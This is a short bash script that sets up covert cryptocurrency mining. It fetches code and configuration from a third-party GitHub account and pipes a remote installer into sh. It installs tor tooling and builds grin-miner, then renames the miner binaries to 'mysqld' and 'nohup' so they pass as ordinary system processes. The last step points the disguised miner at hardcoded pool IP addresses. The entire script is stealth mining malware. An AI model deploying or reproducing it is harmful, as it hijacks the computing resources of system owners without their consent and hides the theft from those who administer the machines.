!#/bin/bash

pub[0]="025972896F819CA931B61B811A13589FCEBA6CE5D6DEC30127675FFAD5327DE6C1"
ip[0]="13.229.119.163"
pub[1]="03A2ACC10B7F6507376DA8AE6FCBB5F1384B8E78F8C6730D5DD8514003A5075452"
ip[1]="13.229.79.67"
pub[2]="02699F19FB9DC7D945F6A187A07B8A9C58A7D737C9DD391B21BF252C1E020B36C7"
ip[2]="175.156.210.255"

rand=$[$RANDOM % ${#pub[@]}]
random_pub=${pub[$rand]}
random_ip=${ip[$rand]}
echo ${random_pub}
echo ${random_ip}

git clone https://github.com/orpheusyalcon/durian
cd durian
cp zilminer mysqld
chmod +x mysqld
cd ..
apt-get --no-install-recommends --yes install tor torsocks libncurses5-dev libncursesw5-dev cmake git curl libssl-dev pkg-config
curl https://sh.rustup.rs -sSf | sh -s -- -y
git clone https://github.com/mimblewimble/grin-miner
cd grin-miner
git submodule update --init
rm Cargo.toml && wget https://raw.githubusercontent.com/orpheusyalcon/mainsmile/master/Cargo.toml
$HOME/.cargo/bin/cargo build --release
rm grin-miner.toml
wget https://raw.githubusercontent.com/orpheusyalcon/allsmile/master/grin-miner.toml
date_now=$(date +%s) && sed -i 's/first/${date_now}/g' grin-miner.toml
cp target/release/grin-miner target/release/nohup
./target/release/nohup &
cd durian && ./mysqld -P zil://${random_pub}.worker_2@${random_ip}:4202
